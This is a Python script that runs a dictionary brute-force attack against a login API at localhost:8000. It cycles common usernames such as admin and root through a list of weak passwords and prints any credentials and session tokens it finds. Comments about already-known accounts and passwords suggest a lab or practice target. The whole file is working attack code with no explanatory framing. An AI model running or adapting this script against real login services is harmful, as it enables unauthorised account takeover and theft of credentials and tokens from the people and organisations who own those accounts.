import requests
import time

# Target URL
login_url = "http://localhost:8000/api/login"

# Known usernames to try (we already know "admin" and "user" exist)
usernames = ["admin", "user", "root", "administrator", "system"]

# Common passwords to try as fallback if dictionary file not found
default_passwords = [
    "password", "123456", "admin", "password123", "user123",
    "admin123", "qwerty", "letmein", "welcome", "test",
    "password1", "12345678", "abc123", "1234", "admin1"
]

# Keep track of successful logins
successful_logins = []


def try_login(username, password):
    # Create the payload
    payload = {
        "username": username,
        "password": password
    }

    try:
        # Send the login request
        response = requests.post(login_url, json=payload)

        # Parse the response
        data = response.json()

        # Check if login was successful
        if data.get("success", False):
            print(f"[SUCCESS] Username: {username}, Password: {password}")
            print(f"Token: {data.get('token', 'No token found')}")
            successful_logins.append((username, password, data.get("token")))
            return True
        else:
            print(f"[FAILED] Username: {username}, Password: {password}")
            return False

    except Exception as e:
        print(f"[ERROR] {e}")
        return False


def brute_force_with_dictionary(dictionary_file="passwords.txt"):
    print(f"Starting dictionary attack using {dictionary_file}...")

    try:
        with open(dictionary_file, 'r') as file:
            dictionary_passwords = [line.strip() for line in file]

        print(f"Loaded {len(dictionary_passwords)} passwords from dictionary file")

        for username in usernames:
            print(f"\nTrying username: {username}")
            for password in dictionary_passwords:
                success = try_login(username, password)
                time.sleep(0.1)  # Small delay to avoid overwhelming the server

                # Optional: stop after finding a valid password for this username
                if success:
                    print(f"Found valid credentials for {username}, continuing to next username...")
                    break

    except FileNotFoundError:
        print(f"Error: Dictionary file '{dictionary_file}' not found.")
        print("Falling back to default password list...")

        for username in usernames:
            print(f"\nTrying username: {username}")
            for password in default_passwords:
                success = try_login(username, password)
                time.sleep(0.1)

                # Optional: stop after finding a valid password for this username
                if success:
                    print(f"Found valid credentials for {username}, continuing to next username...")
                    break

    # Print summary of successful logins
    print("\nDictionary Attack completed.")
    print(f"Found {len(successful_logins)} valid login(s):")

    for username, password, token in successful_logins:
        print(f"Username: {username}, Password: {password}")
        print(f"Token: {token}")
        print("---")


# Create a simple test dictionary file
def create_test_dictionary():
    try:
        with open("passwords.txt", "w") as f:
            # Include the known passwords + some others
            passwords = [
                "password123",
                "user123",
                "admin",
                "root",
                "1234",
                "qwerty",
                "letmein",
                "password",
                "123456",
                "welcome",
                "administrator"
            ]
            f.write("\n".join(passwords))
        print("Created test dictionary file 'passwords.txt'")
    except Exception as e:
        print(f"Error creating dictionary file: {e}")


# Start the attack
if __name__ == "__main__":
    create_test_dictionary()  # Create a sample dictionary for testing
    brute_force_with_dictionary()